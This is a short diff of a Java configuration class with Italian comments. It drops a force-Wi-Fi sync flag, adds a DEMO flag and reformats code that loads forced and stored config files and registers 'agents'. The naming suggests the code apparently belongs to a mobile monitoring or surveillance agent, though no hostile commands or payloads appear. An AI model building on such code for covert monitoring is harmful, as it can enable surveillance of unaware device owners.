@@ -71,7 +71,6 @@ public final class Conf {
     public static final String DEFAULT_APN_USER = "";
     public static final String DEFAULT_APN_PWD = "";
 
-    public static final boolean SYNCACTION_FORCE_WIFI = true;
     public static boolean SET_SOCKET_OPTIONS = true;
     public static boolean SD_ENABLED = false;
 
@@ -82,6 +81,7 @@ public final class Conf {
     public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
     public static boolean IS_UI = true;
+    public static boolean DEMO = false;
 
     public static final boolean MAIL_TEXT_FORCE_UTF8 = true;
 
@@ -203,8 +203,7 @@ public final class Conf {
         AutoFile file;
 
         //#ifdef DEBUG
-        file = new AutoFile(Path.SD() + Path.CONF_DIR + Conf.FORCED_CONF,
-                true);
+        file = new AutoFile(Path.SD() + Path.CONF_DIR + Conf.FORCED_CONF, true);
         if (file.exists()) {
             debug.info("Try: forced config");
             final byte[] readfile = file.read();
@@ -221,8 +220,7 @@ public final class Conf {
         }
         //#endif
 
-        file = new AutoFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF,
-                true);
+        file = new AutoFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: new config");
@@ -246,8 +244,8 @@ public final class Conf {
             }
         }
 
-        file = new AutoFile(
-                Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
+        file = new AutoFile(Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF,
+                true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: actual config");
@@ -500,7 +498,7 @@ public final class Conf {
                 agent.init(enabled, confParams);
             } else {
                 agent = Agent.factory(agentType, enabled, confParams);
-                if(agent!=null){
+                if (agent != null) {
                     status.addAgent(agent);
                 }
             }
